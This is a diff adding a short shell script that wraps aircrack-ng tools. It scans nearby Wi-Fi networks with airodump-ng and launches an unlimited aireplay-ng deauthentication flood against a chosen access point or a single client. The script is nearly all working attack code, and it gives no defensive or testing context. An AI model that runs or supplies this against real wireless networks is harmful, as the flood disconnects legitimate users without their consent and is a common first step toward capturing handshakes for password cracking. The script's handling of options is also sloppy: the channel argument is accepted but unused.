@@ -1,0 +1,59 @@
+#!/bin/sh
+
+int=wlan0
+
+function list_networks() {
+    if [[ $1 ]] ; then
+        airodump-ng --bssid $1 $int
+    else
+        airodump-ng $int
+    fi
+}
+
+function deauth_attack() {
+    local bssid=$1
+    local channel=$2
+    local target=$3
+
+    echo "Deauthenticating devices on channel $channel for BSSID: $bssid"
+
+    if [[ $target ]]; then
+    	aireplay-ng --deauth 0 -a $bssid -c $target $int
+    else
+    	aireplay-ng --deauth 0 -a $bssid $int
+    fi
+
+    # for i in {0..1000}
+    # do
+    #     aireplay-ng "$@"       # Pass all arguments to aireplay-ng
+    # done
+}
+
+while getopts ":l:a:" opt; do
+    case $opt in
+        l)
+            list_networks "$OPTARG"
+            ;;
+        a)
+            shift $((OPTIND-2))  # Move to the first non-option argument
+            deauth_attack "$@"
+            ;;
+        \?)
+            echo "Invalid option: -$OPTARG" >&2
+            exit 1
+            ;;
+        :)
+            echo "Option -$OPTARG requires an argument." >&2
+            exit 1
+            ;;
+    esac
+done
+
+# Check for subcommands
+shift $((OPTIND-1))
+if [[ $# -eq 0 ]]; then
+    echo "Usage: $0 [-l <BSSID>] | [-a <BSSID> -c <channel>]"
+    exit 1
+elif [[ $1 == "list" ]]; then
+	list_networks
+fi
